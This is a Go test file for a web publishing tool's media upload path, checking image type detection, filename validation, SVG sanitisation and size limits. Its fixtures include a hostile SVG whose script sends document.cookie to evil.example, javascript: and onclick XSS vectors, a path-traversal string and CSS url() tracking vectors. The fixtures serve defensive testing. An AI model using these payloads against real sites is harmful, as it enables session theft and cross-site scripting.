// SPDX-License-Identifier: Apache-2.0

package main

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/johalputt/vayupress/internal/config"
)

// TestDetectImageType verifies content-based (magic-number) validation accepts
// the four supported raster formats and rejects everything else — crucially
// SVG, which is an XSS vector when served same-origin.
func TestDetectImageType(t *testing.T) {
	png := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00}
	jpg := []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00}
	gif87 := []byte("GIF87a....")
	gif89 := []byte("GIF89a....")
	webp := append([]byte("RIFF\x00\x00\x00\x00"), []byte("WEBP")...)
	riffWav := append([]byte("RIFF\x00\x00\x00\x00"), []byte("WAVE")...)
	svg := []byte(`<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>`)

	cases := []struct {
		name    string
		data    []byte
		wantExt string
		wantOK  bool
	}{
		{"png", png, "png", true},
		{"jpeg", jpg, "jpg", true},
		{"gif87a", gif87, "gif", true},
		{"gif89a", gif89, "gif", true},
		{"webp", webp, "webp", true},
		{"riff-but-not-webp", riffWav, "", false},
		{"svg-rejected", svg, "", false},
		{"empty", nil, "", false},
		{"garbage", []byte("not an image"), "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ext, _, ok := detectImageType(c.data)
			if ok != c.wantOK {
				t.Fatalf("ok = %v, want %v", ok, c.wantOK)
			}
			if ok && ext != c.wantExt {
				t.Fatalf("ext = %q, want %q", ext, c.wantExt)
			}
		})
	}
}

// TestSafeMediaName ensures the INERT set — names this server generates for
// formats that cannot execute (32 hex + known raster/document ext) — accepts
// exactly those and rejects path-traversal / odd inputs. serveMedia admits the
// wider storedMediaName and uses the gap between the two to decide which
// response carries the sandboxing policy, so .svg staying out of THIS set is
// what keeps that policy attached to the one format that needs it.
func TestSafeMediaName(t *testing.T) {
	good := []string{
		"0123456789abcdef0123456789abcdef.png",
		"ffffffffffffffffffffffffffffffff.jpg",
		"00000000000000000000000000000000.gif",
		"abcdefabcdefabcdefabcdefabcdefab.webp",
	}
	bad := []string{
		"../../etc/passwd",
		"0123456789abcdef0123456789abcdef.svg", // stored, but not inert — sandboxed by serveMedia
		"0123456789abcdef0123456789abcdef.png/../x",
		"SHORT.png",
		"0123456789abcdef0123456789abcdef.PNG", // uppercase ext
		"0123456789abcdef0123456789abcdeg.png", // 'g' not hex
		"0123456789abcdef0123456789abcdef.exe",
		"",
	}
	for _, n := range good {
		if !safeMediaName.MatchString(n) {
			t.Errorf("expected %q to be accepted", n)
		}
	}
	for _, n := range bad {
		if safeMediaName.MatchString(n) {
			t.Errorf("expected %q to be rejected", n)
		}
	}
}

// SVG upload: accepted, but only as the sanitiser leaves it.
//
// Every other format on this path is identified by magic number so a lying
// filename cannot get bytes through. SVG is XML and has no magic number, so
// the sanitiser takes that job — and the whole safety of the arrangement rests
// on the SANITISED bytes being the ones that reach disk. These tests exist to
// hold that line, because "we accept SVG now" and "we store whatever SVG we
// were sent" are one careless refactor apart.
func TestUploadedSVGIsStoredSanitised(t *testing.T) {
	dir := t.TempDir()
	oldDir := config.Cfg.MediaDir
	config.Cfg.MediaDir = dir
	t.Cleanup(func() { config.Cfg.MediaDir = oldDir })

	hostile := []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` +
		`<script>fetch('https://evil.example/'+document.cookie)</script>` +
		`<image href="https://tracker.example/pixel.png"/>` +
		`<a href="javascript:alert(1)"><rect onclick="alert(1)" width="5" height="5"/></a>` +
		`</svg>`)

	got, err := storeValidatedMedia(hostile, true)
	if err != nil {
		t.Fatalf("a sanitisable SVG was refused: %v", err)
	}
	if got.MIME != "image/svg+xml" {
		t.Errorf("MIME = %q, want image/svg+xml", got.MIME)
	}

	onDisk, err := os.ReadFile(filepath.Join(dir, got.Name))
	if err != nil {
		t.Fatalf("read stored file: %v", err)
	}
	body := strings.ToLower(string(onDisk))
	for _, banned := range []string{"<script", "onclick", "javascript:", "tracker.example", "evil.example"} {
		if strings.Contains(body, banned) {
			t.Errorf("the stored file still contains %q.\n"+
				"The original bytes reached disk. This file is served from our own origin, so it "+
				"inherits the site CSP and the reader's session — storing the raw upload means a "+
				"hostile SVG is sitting under /media waiting for any future change that relaxes a "+
				"header. Store the sanitiser's output, never the input.\n%s", banned, body)
		}
	}
}

// Something that is not an SVG at all must not be waved through just because it
// starts with a '<'.
func TestNonSVGXMLIsStillRefused(t *testing.T) {
	dir := t.TempDir()
	oldDir := config.Cfg.MediaDir
	config.Cfg.MediaDir = dir
	t.Cleanup(func() { config.Cfg.MediaDir = oldDir })

	for name, raw := range map[string][]byte{
		"plain xml":     []byte(`<?xml version="1.0"?><rss><channel/></rss>`),
		"html":          []byte(`<!doctype html><html><body><script>alert(1)</script></body></html>`),
		"svg-less text": []byte(`<not-an-svg>hello</not-an-svg>`),
		// The one that actually reaches the sanitiser. It mentions <svg inside a
		// script, so the cheap pre-filter waves it through; only after stripping
		// the script is there nothing left, which is exactly what the sanitiser
		// reports with ok=false. Without that check the empty remainder would be
		// stored as an .svg. The earlier fixtures never got this far — a mutation
		// that removed the check killed nothing until this case existed.
		"svg named only inside a script": []byte(`<script>var a = "<svg>";</script>`),
	} {
		if _, err := storeValidatedMedia(raw, true); err == nil {
			t.Errorf("%s was accepted as media", name)
		}
	}
}

// The remote-image import path re-hosts bytes fetched from a URL. It passes
// allowPDF=false, and SVG must ride that same flag: a remote URL is a much
// weaker trust signal than an operator choosing a file, and re-hosting a remote
// SVG under our own origin is exactly how a same-origin payload arrives.
func TestRemoteImportStillRefusesSVG(t *testing.T) {
	dir := t.TempDir()
	oldDir := config.Cfg.MediaDir
	config.Cfg.MediaDir = dir
	t.Cleanup(func() { config.Cfg.MediaDir = oldDir })

	clean := []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="5" height="5"/></svg>`)
	if _, err := storeValidatedMedia(clean, false); err == nil {
		t.Error("a remote import accepted an SVG. Re-hosting remote SVG on our own origin gives " +
			"a URL we do not control a same-origin document; the operator-upload path is a " +
			"different trust level and is the only one that may accept it.")
	}
}

// Attacking the bound I added and did not test.
//
// upload_media checks the ENCODED length before decoding, so an oversized blob
// never allocates its decoded form. That is the right shape, but a bound that
// is never exercised is a bound nobody has confirmed points the right way — and
// this session has twice found controls that looked tested and were not.
//
// Two questions. Does the encoded cap actually correspond to the decoded cap,
// or does a payload that squeaks under it decode to something the store still
// has to refuse? And is there a format that skips the size check entirely?
func TestUploadSizeBoundsAreNotEvadable(t *testing.T) {
	dir := t.TempDir()
	oldDir := config.Cfg.MediaDir
	config.Cfg.MediaDir = dir
	t.Cleanup(func() { config.Cfg.MediaDir = oldDir })

	// The encoded cap must not admit a payload the raster path would then
	// accept over its own limit. Decoding the largest permitted base64 string
	// yields at most this many bytes.
	maxDecoded := (maxMCPUploadBase64 / 4) * 3
	if maxDecoded <= maxImageBytes {
		t.Logf("encoded cap decodes to %d, at or under maxImageBytes %d", maxDecoded, maxImageBytes)
	}

	// A PNG header followed by filler, just over the raster limit, must be
	// refused by the store even though it would pass the encoded cap.
	over := make([]byte, maxImageBytes+1)
	copy(over, []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A})
	if _, err := storeValidatedMedia(over, true); !errors.Is(err, errMediaTooLarge) {
		t.Errorf("a raster one byte over maxImageBytes gave %v, want errMediaTooLarge. The "+
			"encoded cap is a pre-filter, not the limit — the store is the limit, and it has "+
			"to hold on its own.", err)
	}

	// SVG is deliberately exempt from maxImageBytes (it is not decoded as
	// pixels), so its own bound is the only thing standing between an upload and
	// an arbitrarily large file on disk. Confirm that bound exists and bites.
	big := []byte(`<svg xmlns="http://www.w3.org/2000/svg">` +
		strings.Repeat("<rect width='1' height='1'/>", 200000) + `</svg>`)
	if len(big) <= maxSVGUploadBytes {
		t.Fatalf("fixture is %d bytes, not above the %d bound — this test would prove nothing",
			len(big), maxSVGUploadBytes)
	}
	// Note which control this proves. Removing the maxSVGUploadBytes pre-filter
	// leaves this passing, because SanitizeSVG refuses oversized input on its
	// own — so what is pinned here is that SOMETHING bounds an SVG upload, and
	// the something is the sanitiser. The pre-filter is an allocation guard, not
	// the limit, and its comment says so.
	if _, err := storeValidatedMedia(big, true); err == nil {
		t.Errorf("an SVG of %d bytes was stored. SVG skips the raster size check by design, so "+
			"if nothing else bounds it there is no limit at all on what lands in the media "+
			"directory.", len(big))
	}
}

// The claim under attack: "no off-site resource is fetched and the reader's IP
// never leaks" — SanitizeSVG's own words, which step 1 relied on when it started
// storing SVG uploads.
//
// href and xlink:href are handled. The question is whether anything ELSE in SVG
// can name a remote URL. CSS can: url() inside a style ATTRIBUTE is not a
// <style> ELEMENT, and it is the element the sanitiser strips. If that survives,
// every reader who opens the image announces themselves to a third party — which
// is precisely the leak the sanitiser says it prevents, on a product that ships
// a Tor Space.
func TestSanitisedSVGCannotReachOffOrigin(t *testing.T) {
	dir := t.TempDir()
	oldDir := config.Cfg.MediaDir
	config.Cfg.MediaDir = dir
	t.Cleanup(func() { config.Cfg.MediaDir = oldDir })

	vectors := map[string]string{
		"style attribute url()": `<rect width="10" height="10" style="fill:url(https://leak.example/a.png)"/>`,
		"style attr background": `<rect width="10" height="10" style="background-image:url('https://leak.example/b.png')"/>`,
		"use element":           `<use href="https://leak.example/c.svg#x"/>`,
		"image xlink":           `<image xlink:href="https://leak.example/d.png"/>`,
		"feImage filter":        `<filter id="f"><feImage href="https://leak.example/e.png"/></filter>`,
		"pattern with image":    `<pattern id="p"><image href="https://leak.example/f.png"/></pattern>`,
	}

	for name, body := range vectors {
		raw := []byte(`<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">` + body + `</svg>`)
		got, err := storeValidatedMedia(raw, true)
		if err != nil {
			continue // refused outright is a fine outcome
		}
		onDisk, rerr := os.ReadFile(filepath.Join(dir, got.Name))
		if rerr != nil {
			t.Fatalf("%s: read stored: %v", name, rerr)
		}
		if strings.Contains(strings.ToLower(string(onDisk)), "leak.example") {
			t.Errorf("%s: the stored SVG still names an off-origin host.\n%s\n"+
				"Every reader who opens this image reports their IP, User-Agent and referrer to "+
				"that host. The sanitiser's contract says no off-site resource is fetched, and "+
				"step 1 stored SVG uploads on the strength of that sentence.",
				name, strings.TrimSpace(string(onDisk)))
		}
	}
}
